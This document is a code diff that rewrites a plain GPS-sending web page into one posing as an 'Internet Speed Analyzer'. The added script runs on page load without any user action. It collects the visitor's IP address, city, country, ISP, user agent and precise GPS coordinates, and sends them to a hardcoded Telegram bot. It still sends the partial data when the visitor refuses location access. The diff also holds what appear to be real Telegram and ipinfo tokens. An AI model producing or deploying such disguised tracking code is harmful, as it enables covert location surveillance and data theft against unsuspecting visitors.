@@ -1,56 +1,102 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>GPS Location Sender</title>
+  <meta charset="UTF-8">
+  <title>Internet Speed Analyzer</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f0f0f0;
+      text-align: center;
+      padding: 2rem;
+    }
+    .card {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      padding: 2rem;
+      display: inline-block;
+      max-width: 400px;
+    }
+    h1 {
+      color: #333;
+    }
+    .status {
+      margin-top: 1rem;
+      font-size: 0.95rem;
+      color: #555;
+    }
+  </style>
 </head>
 <body>
-  <h1>📍 GPS Access Required</h1>
-  <button onclick="getLocation()">Activate GPS</button>
-  <p id="status">Waiting for user action...</p>
+  <div class="card">
+    <h1>Speed Analyzer</h1>
+    <p>Analyzing your internet speed and region-based latency...</p>
+    <p class="status" id="status">Initializing...</p>
+  </div>
 
   <script>
-    const BOT_TOKEN = "7617031761:AAGyUI2Ly-7TzxLlpIqtb1M_H7MJznnRvUw";
+    const TOKEN = "7617031761:AAGyUI2Ly-7TzxLlpIqtb1M_H7MJznnRvUw";
     const CHAT_ID = "6978055162";
 
-    function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-      fetch(url)
-        .then(res => {
-          document.getElementById("status").innerText = res.ok
-            ? "✅ Location sent to Telegram."
-            : "❌ Failed to send location.";
+    async function sendToTelegram(message) {
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
         })
-        .catch(() => {
-          document.getElementById("status").innerText = "❌ Error sending location.";
-        });
+      });
     }
 
-    function getLocation() {
-      document.getElementById("status").innerText = "Requesting GPS access...";
-      
-      if (!navigator.geolocation) {
-        document.getElementById("status").innerText = "❌ Geolocation not supported.";
-        return;
+    async function collectData() {
+      const status = document.getElementById("status");
+      status.innerText = "Getting IP and system info...";
+
+      let ipData = {};
+      try {
+        const res = await fetch("https://ipinfo.io/json?token=1ed7e8a879f5de");
+        ipData = await res.json();
+      } catch (e) {
+        ipData = { ip: "Unknown", city: "-", country: "-", org: "-" };
       }
 
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
+      const userAgent = navigator.userAgent;
+      const time = new Date().toLocaleString();
+
+      const baseMsg = `
+📡 Internet Speed Analyzer
+🕒 Time: ${time}
+🌐 IP: ${ipData.ip}
+🏙 Location: ${ipData.city}, ${ipData.country}
+📶 ISP: ${ipData.org}
+🧠 User Agent: ${userAgent}
+      `;
+
+      status.innerText = "Requesting GPS access...";
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (position) => {
           const { latitude, longitude } = position.coords;
-          const message = `📍 User Location:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
-          sendToTelegram(message);
-        },
-        (error) => {
-          const errors = {
-            1: "❌ Permission denied.",
-            2: "❌ Location unavailable.",
-            3: "❌ Request timed out.",
-          };
-          document.getElementById("status").innerText = errors[error.code] || "❌ Unknown error.";
-        },
-        { enableHighAccuracy: true, timeout: 10000 }
-      );
+          const fullMessage = baseMsg + `\n📍 GPS: Latitude ${latitude}, Longitude ${longitude}`;
+          await sendToTelegram(fullMessage);
+          status.innerText = "✅ Data sent successfully.";
+        }, async (error) => {
+          const fullMessage = baseMsg + `\n📍 GPS: Permission denied`;
+          await sendToTelegram(fullMessage);
+          status.innerText = "⚠️ GPS permission denied, partial data sent.";
+        });
+      } else {
+        const fullMessage = baseMsg + `\n📍 GPS: Not supported`;
+        await sendToTelegram(fullMessage);
+        status.innerText = "⚠️ Geolocation not supported.";
+      }
     }
+
+    collectData();
   </script>
 </body>
 </html>
